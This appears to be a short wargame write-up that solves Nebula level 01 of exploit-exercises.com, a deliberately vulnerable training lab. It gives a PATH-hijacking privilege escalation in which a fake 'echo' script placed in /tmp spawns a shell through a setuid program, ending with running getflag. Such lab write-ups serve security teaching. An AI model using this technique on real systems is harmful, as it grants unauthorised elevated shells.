.. _nebula01:

.. role:: bash(code)
	  :language: bash

Nebula level 01
===============

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level01/

Solution
--------

Export :bash:`PATH` first

:bash:`$ export PATH=/tmp:$PATH`

On :bash:`tmp` create a bash script with this and name it echo (without extension):

.. code-block:: bash
		#!/bin/bash
		bash

:bash:`$ chmod 777 echo`

and last execute :bash:`getflag` 

